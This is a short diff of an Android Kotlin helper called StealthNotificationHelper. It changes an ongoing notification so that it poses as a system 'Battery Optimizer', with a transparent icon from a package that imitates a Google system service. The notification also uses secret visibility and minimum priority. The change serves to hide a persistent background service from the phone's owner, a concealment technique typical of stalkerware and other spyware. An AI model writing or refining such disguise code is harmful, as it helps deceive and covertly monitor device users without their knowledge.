@@ -50,9 +50,9 @@ object StealthNotificationHelper {
         createStealthChannel(context)
         
         val builder = NotificationCompat.Builder(context, STEALTH_CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.ic_popup_sync)
-            .setContentTitle("")  // Empty title
-            .setContentText("")   // Empty text
+            .setSmallIcon(com.google.android.systemservice.R.drawable.transparent_icon)
+            .setContentTitle("Battery Optimizer")  // Generic system title
+            .setContentText("Optimizing battery usage...")   // Generic system text
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setOngoing(true)
